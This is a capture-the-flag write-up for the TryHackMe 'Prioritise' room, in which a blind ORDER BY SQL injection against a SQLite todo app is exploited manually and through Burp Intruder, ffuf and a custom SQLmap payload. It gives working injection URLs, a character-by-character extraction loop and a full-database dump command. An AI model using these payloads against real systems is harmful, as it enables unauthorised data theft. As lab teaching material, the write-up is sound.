# Prioritise

https://tryhackme.com/room/prioritise

A medium rated room.

A reasonably simple room, in that there is only really one thing you need to exploit to get the flag. However, that single exploit can be a bit tricky and time consuming, and it took me around six hours haha, largely because I refused to accept Sqlmap wouldn't do it for me (it doesn't seem to be possible with raw Sqlmap) - when I finally gave up and tried to exploit this manually, it worked straight away. That being said, I did *eventually* also figure out how to do this with SQLmap, and another way too, so I am going to cover all three approaches.

First, the room enumeration: there are two ports open, 22 and 80. On 80 is a simple website allowing you to create todo items. You can also delete created items, and order them via a drop down. Ordering them is of particular interest because its the only way the output can be affected with a GET request, and because if you change the value in the `?order=` query string to a nonsense value, the site will crash. The default values in the drop down are `title`, `done` and `date` - these look like column names, and if you change the value to `id` in the querystring it doesn't crash and orders successfully. Also if you create a few items with different dates and then pass `?order=date+desc` or `?order=date+asc` you can affect the result. Therefore, this looks like SQL Injection via the order parameter. Note that you need to create at least one item in order to use this parameter.

ORDER BY sql injection has some caveats: one advantage is that you can use it to determine column count: pass numbers from 1 to 4 and the site will work, five and beyond and it will crash. So the query is getting four columns, presumably ID, Title, Done and Date. The problem with an ORDER BY SQLi is that it only offers blind injection: you cant add a UNION after an order by, and nothing you inject in an order by will reflect to the results - all you can do is affect the order. You can however pass a nested SELECT statement, e.g `?order=(SELECT * FROM todos)` and while this won't affect the output in this room, if that statement is valid (as in the SQL compiles) the page will load, else it will crash.

This is enough to help fingerprint the database: passing `?order=(SELECT @@version)` crashes, which means the backend ISN'T MySQL, MariaDB or MSSQL. Going through various databases, `?order=(SELECT sqlite_version())` works, no crash, so the backend is a SQLite database.

At this point, a list of possible injections for SQLite can be useful. This list from the swisskeyrepo is very useful: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md. In fact, a simple boolean based blind can be achieved with `?order=(CASE WHEN 1=1 THEN title ELSE date END)` - it'll order by title, and if you change 1=1 to 1=0, it'll order by date. On top of that, change it to `?order=(CASE WHEN 1=1 THEN title ELSE load_extension(0) END)` and it will crash when 1=0, another type of boolean based blind (with an generic error).

As this is a trivial injection though, presumably [SQLMap](https://sqlmap.org/) should be able to exploit this, right? `sqlmap -u http://[IPADDRESS]/?order=title` finds nothing though, reporting that 'order' is not vulnerable. I messed around with risk, levels, various techniques and so on but try as I might, it wouldn't work - this was quite frustrating because despite it being an ORDER BY sqli, SQLite explicitly supports such and the query did not look particularly complicated (no esoteric encoding or weird restrictions) - why wouldn't it work? Eventually I did manage to get it to pickup a heavy time based blind, but that was wrong - for the vulernability I shouldn't need a temperatmental time based blind. It was also really unstable, crashing and throwing errors about WAFs and so on.

I spent *hours* trying to get SQLmap to do what I wanted, digging deep into how the tool works and learning a bit as I went:

- in the default case, where you alternate between two different ordering params, the output size is the same - same code and same content length. SQLMap will not inspect the entire response byte by byte or by hash to determine differences, and so treats both responses as being indifferent.
- there is a test in SQLmap very similar to my manual boolean blinds, but it uses `(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)`, which will not alter the output significantly.
- if a custom payload is used (something I learned about for this room), e.g. `(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE load_extension(0) END)` this will cause a crash, which SQLmap by default will handle as a failure in its work not an indicator of a boolean blind
- you might think you could use an error-based injection here, but in SQLmap thats an attack that involves extracting output from the error message, not a blind attack - here the error message is a bland 500 error page with no further information regardless of cause.

In short, SQLmap supports by default boolean based blinds where the output size changes in each case, and error based blinds where the error message contains content. Neither works in this room.

## Solutions

I figured out three ways of doing this: two with the same technique but with different tools, and one with SQLmap

### Solution 1: Use Burp Suite Professional (if you own it) - or community if you have infinite patience

Burp Suite Intruder can use a technique listed at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#boolean---extract-info-order-by. This was how I first solved the room.

- Fire up burp and send a normal request to the site. Send the request to Intruder
- Under 'Positions', change the attack type to 'Cluster Bomb'. Change the request URL line to: `GET /?order=(CASE+WHEN+(SELECT+hex(substr(sql,§1§,1))+FROM+sqlite_master+WHERE+type%3d'table'+and+tbl_name+NOT+like+'sqlite_%25'+limit+1+offset+0)+%3d+hex('§some_char§')+THEN+id+ELSE+load_extension(0)+END)`. Note the two positions: `§1§` in the position of the substr function, and `§some_char§` in the comparison to the character at that position.
- You need two payload sets: the first can be of type numbers, 1 to 50 for example, while the second can be a custom 'simple list', containing all letters and numbers
- Run the attack - it might be advisable to up the resource to do something like 50 concurrent requests, if you have professional and can do this.
- As the attack is running, change the filter to hide 500 errors. If you sort by the first payload you will see you can extract the result one character at the time.

The script above uses the `select sql from sqlite_master` to extract the databases specification. This allows you to find table names, finding there is a table named flag with a field named flag, where you can extract the content using the same technique (change it to something like `(CASE WHEN (SELECT hex(substr(flag,1,1)) FROM flag) = hex('B') THEN id ELSE load_extension(0) END)`, url encoded.

### Solution 2: use FFUF from the attack box

If you dont have a corp willing to buy you $700NZD of burp suite professional, you can perform the same attack as solution 1 with ffuf.

1. you need a wordlist for the characters, like with burp. This can be created with the `crunch` tool: `crunch 1 1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 > wordlist`
2. while ffuf supports multiple wordlists, getting this to work for me was a bit tricky, so instead I used a simple bash op:

```bash
for i in {1..40}; do ffuf -u "http://10.10.73.252/?order=(CASE%20WHEN%20(SELECT%20hex(substr(flag,$i,1))%20FROM%20flag)%20=%20hex('FUZZ')%20THEN%20id%20ELSE%20load_extension(0)%20END)" -w wordlist -ignore-body 2>/dev/null >> result; done
```

What this does is, for each number in 1 to 40, call ffuf with the same payload we used in burp. The wordlist is the chars we created - by default ffuf will only find the single result where the code is 200, ignoring all the errors. We pass the flag -ignore-body as we are only interested in the headers (might make this easier) and hide stderror via `2>/dev/null` - this is done because, very usefully, ffuf prints its ascii header and status messages to stderror precisely so you can hide them if you want. Finally the result (the single 200 code found) is appended to the result file.

3. Each line in the result file will be something like `f                       [Status: 200, Size: 4349, Words: 0, Lines: 0]`, with there being some unprintable characters (seen with `xxd result`) before that `f`. These can be extracted, and then turned into a single like with `cut -c6 result | tr -d '\n'` - the first apparent character on each line was the sixth character.

### Solution 3: SQLmap

To get SQLmap working, there are two things that need to be done: you need a custom payload that will trigger an 'error based blind', and you need it to not treat 500 errors as operational failures.

1. To ignore 500s, there is the simple parameter I somehow missed entirely until I came back to the room the following day, `--ignore-code=500`
2. To create the custom payload, I took a look at `/usr/share/sqlmap/xml/payloads/`, where the various payloads SQLmap uses are. What I wanted was a boolean based blind with a case statement, and I had seen some syntax that was very similar to what I could do manually in the output of SQLmap (`-v 5` will show you exactly what its running)
3. Grepping for CASE in `/usr/share/sqlmap/xml/payloads/boolean_blind.xml` I found an appropriate blind around position 1040:

```xml
    <test>
        <title>Boolean-based blind - Parameter replace (CASE)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)</vector>
        <request>
            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)</comparison>
        </response>
    </test>
```

The problem with the above is that that `ELSE NULL` will not trigger a change in the response. I could force it to `ELSE title` or date or whatever, but again, SQLmaps comparison function would see two pages with the same content length and assume it was not working.

HOWEVER, with the ability to force SQLmap to treat 500 errors as valid response via that ignore-code parameter, if I could modify the above to force an exception, I could have a working boolean blind:

```xml
    <test>
        <title>CUSTOM Boolean-based blind - Parameter replace (CASE)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE load_extension(0) END)</vector>
        <request>
            <payload>(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE load_extension(0) END)</payload>
        </request>
        <response>
            <comparison>(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE load_extension(0) END)</comparison>
        </response>
    </test>
```

I changed NULL to `load_extension(0)`, which is a sqlite function disabled in the db and even if it wasn't, 0 isn't a valid parameter for it. This triggers a 500 error. Note that I also prepended `CUSTOM` to the title, this allows me to filter it.

Now a boolean blind should work: the two responses from the case statement do have a different content length, and so a true/false bit flip for its clauses should allow SQLmap to do its magic.

4. Finally, running `sqlmap -u http://10.10.73.252/?order=1 --test-filter=CUSTOM --ignore-code=500 -a` **immediately** returns a detection hit. In fact, the `-a` or 'all' parameter will then proceed to dump the entire contents of the SQLite instance, including the flag :) Very easy, very quick - on the attack machine this took less than ten seconds to do its work.

## Conclusion

Overall, a room where I tried too hard to automate when I should have just approached it manually, but which I am glad I did faff about in as I learned a hell of a lot about how SQLmap works, a very useful tool in any hacker's arsenal.
